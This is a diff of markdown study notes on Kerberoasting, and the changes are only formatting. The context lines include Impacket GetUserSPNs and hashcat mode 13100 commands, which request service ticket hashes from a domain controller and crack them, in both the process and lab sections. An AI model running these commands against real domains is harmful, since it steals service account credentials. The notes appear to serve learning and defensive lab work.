@@ -4,13 +4,12 @@
 
 ## Process:
 
-Step 1: Get SPNs, Dump Hash
+Step 1: Get SPNs, Dump Hash  
 `python GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request`
 
-Step 2: Crack the hash
+Step 2: Crack the hash  
 `Hashcat -m 13100 kerberoast.txt rockyou.txt`
 
----
 
 ## Lab
 
@@ -23,7 +22,6 @@ Step 2: Crack the hash
 `hashcat -m 13100 krb.txt /usr/share/wordlist/rockyou.txt`   
 ![Pasted image 20251206182542](images/Pasted-image-20251206182542.png)  
 
----
 
 ## Mitigation
 
